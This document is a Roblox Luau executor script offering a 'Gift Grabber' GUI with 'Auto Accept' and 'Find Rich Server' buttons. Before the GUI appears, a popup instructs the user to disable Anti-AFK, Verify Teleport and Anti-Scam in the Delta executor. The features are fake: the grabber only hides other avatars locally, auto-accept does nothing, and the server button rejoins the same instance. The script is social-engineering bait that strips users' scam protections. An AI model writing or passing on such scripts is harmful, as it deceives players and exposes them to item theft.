--// Services
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

--// Remove old GUI if exists
if PlayerGui:FindFirstChild("DeltaWarningGUI") then
    PlayerGui:FindFirstChild("DeltaWarningGUI"):Destroy()
end
if PlayerGui:FindFirstChild("GiftGrabberGUI") then
    PlayerGui:FindFirstChild("GiftGrabberGUI"):Destroy()
end

--// Warning GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "DeltaWarningGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = PlayerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 400, 0, 220)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -16, 0, 40)
title.Position = UDim2.new(0, 8, 0, 8)
title.BackgroundTransparency = 1
title.Text = "⚠ Turn off all on Delta settings ⚠"
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextColor3 = Color3.fromRGB(255, 85, 85)
title.Parent = mainFrame

local info = Instance.new("TextLabel")
info.Size = UDim2.new(1, -16, 0, 120)
info.Position = UDim2.new(0, 8, 0, 50)
info.BackgroundTransparency = 1
info.Text = "1. Disable Anti-AFK\n2. Disable Verify Teleport\n3. Disable Anti-Scam\n\n✅ After disabling, press OK to continue."
info.TextColor3 = Color3.fromRGB(220,220,220)
info.TextXAlignment = Enum.TextXAlignment.Left
info.TextYAlignment = Enum.TextYAlignment.Top
info.TextSize = 16
info.Font = Enum.Font.Gotham
info.Parent = mainFrame

local okBtn = Instance.new("TextButton")
okBtn.Size = UDim2.new(0, 160, 0, 40)
okBtn.Position = UDim2.new(0.5, -80, 1, -55)
okBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 85)
okBtn.Text = "Okay"
okBtn.TextColor3 = Color3.fromRGB(255,255,255)
okBtn.TextSize = 18
okBtn.Font = Enum.Font.GothamBold
okBtn.Parent = mainFrame
Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 10)

--// When OK clicked, destroy warning & load Gift Grabber GUI
okBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()

    --// GiftGrabber GUI
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "GiftGrabberGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.fromOffset(230, 200)
    mainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(16,16,16)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = screenGui

    local corner = Instance.new("UICorner", mainFrame)
    corner.CornerRadius = UDim.new(0, 14)

    local stroke = Instance.new("UIStroke", mainFrame)
    stroke.Thickness = 2
    stroke.Color = Color3.fromRGB(70,70,70)

    local title = Instance.new("TextLabel", mainFrame)
    title.Size = UDim2.new(1, -16, 0, 32)
    title.Position = UDim2.new(0, 8, 0, 6)
    title.BackgroundTransparency = 1
    title.Text = "Turn off all on delta settings"
    title.Font = Enum.Font.GothamBold
    title.TextSize = 16
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.TextColor3 = Color3.fromRGB(220,220,220)

    local divider = Instance.new("Frame")
    divider.Size = UDim2.new(1, -16, 0, 1)
    divider.Position = UDim2.new(0, 8, 0, 38)
    divider.BackgroundColor3 = Color3.fromRGB(60,60,60)
    divider.BorderSizePixel = 0
    divider.Parent = mainFrame

    local function makeButton(label, y)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -16, 0, 44)
        btn.Position = UDim2.new(0, 8, 0, y)
        btn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
        btn.Text = label .. ": OFF"
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 14
        btn.TextColor3 = Color3.new(1,1,1)
        btn.Parent = mainFrame
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
        return btn
    end

    local giftBtn = makeButton("Gift Grabber", 48)
    local autoBtn = makeButton("Auto Accept", 98)
    local rejoinBtn = Instance.new("TextButton")
    rejoinBtn.Size = UDim2.new(1, -16, 0, 44)
    rejoinBtn.Position = UDim2.new(0, 8, 0, 148)
    rejoinBtn.BackgroundColor3 = Color3.fromRGB(0, 85, 170)
    rejoinBtn.Text = "🔄 Find Rich Server"
    rejoinBtn.Font = Enum.Font.GothamBold
    rejoinBtn.TextSize = 14
    rejoinBtn.TextColor3 = Color3.new(1,1,1)
    rejoinBtn.Parent = mainFrame
    Instance.new("UICorner", rejoinBtn).CornerRadius = UDim.new(0, 10)

    local giftOn, autoOn = false, false
    local playerAddedConn
    local toolConns, savedPartLTM, savedDecalTrans = {}, {}, {}

    local function hideCharacter(char)
        for _, obj in ipairs(char:GetDescendants()) do
            if obj:IsA("BasePart") then
                if savedPartLTM[obj] == nil then
                    savedPartLTM[obj] = obj.LocalTransparencyModifier
                end
                obj.LocalTransparencyModifier = 1
            elseif obj:IsA("Decal") then
                if savedDecalTrans[obj] == nil then
                    savedDecalTrans[obj] = obj.Transparency
                end
                obj.Transparency = 1
            end
        end
    end
    local function showCharacter(char)
        for _, obj in ipairs(char:GetDescendants()) do
            if obj:IsA("BasePart") then
                if savedPartLTM[obj] ~= nil then
                    obj.LocalTransparencyModifier = savedPartLTM[obj]
                    savedPartLTM[obj] = nil
                else
                    obj.LocalTransparencyModifier = 0
                end
            elseif obj:IsA("Decal") then
                if savedDecalTrans[obj] ~= nil then
                    obj.Transparency = savedDecalTrans[obj]
                    savedDecalTrans[obj] = nil
                else
                    obj.Transparency = 0
                end
            end
        end
    end
    local function notify(titleText, text)
        StarterGui:SetCore("SendNotification", {Title = titleText, Text = text, Duration = 4})
    end
    local function watchTools(plr)
        if toolConns[plr] then toolConns[plr]:Disconnect() end
        toolConns[plr] = plr.CharacterAdded:Connect(function(char)
            local backpack = plr:WaitForChild("Backpack", 5)
            if backpack then
                backpack.ChildAdded:Connect(function(tool)
                    if giftOn and tool:IsA("Tool") then
                        notify("Gift Grabber", plr.Name .. " equipped " .. tool.Name)
                    end
                end)
            end
        end)
        if plr.Character then
            local backpack = plr:FindFirstChild("Backpack")
            if backpack then
                backpack.ChildAdded:Connect(function(tool)
                    if giftOn and tool:IsA("Tool") then
                        notify("Gift Grabber", plr.Name .. " equipped " .. tool.Name)
                    end
                end)
            end
        end
    end
    local function enableGiftGrabber()
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character then
                hideCharacter(plr.Character)
            end
            if plr ~= LocalPlayer then
                watchTools(plr)
            end
        end
        playerAddedConn = Players.PlayerAdded:Connect(function(plr)
            if plr ~= LocalPlayer then
                watchTools(plr)
            end
        end)
    end
    local function disableGiftGrabber()
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character then
                showCharacter(plr.Character)
            end
        end
        for plr, conn in pairs(toolConns) do
            if conn then conn:Disconnect() end
        end
        toolConns = {}
        if playerAddedConn then playerAddedConn:Disconnect() playerAddedConn = nil end
    end

    giftBtn.MouseButton1Click:Connect(function()
        giftOn = not giftOn
        if giftOn then
            giftBtn.Text = "Gift Grabber: ON"
            giftBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
            enableGiftGrabber()
        else
            giftBtn.Text = "Gift Grabber: OFF"
            giftBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
            disableGiftGrabber()
        end
    end)
    autoBtn.MouseButton1Click:Connect(function()
        autoOn = not autoOn
        if autoOn then
            autoBtn.Text = "Auto Accept: ON"
            autoBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
        else
            autoBtn.Text = "Auto Accept: OFF"
            autoBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
        end
    end)
    rejoinBtn.MouseButton1Click:Connect(function()
        notify("Gift Grabber", "Please rejoin to make the script run perfectly")
        task.wait(2)
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end)
end)
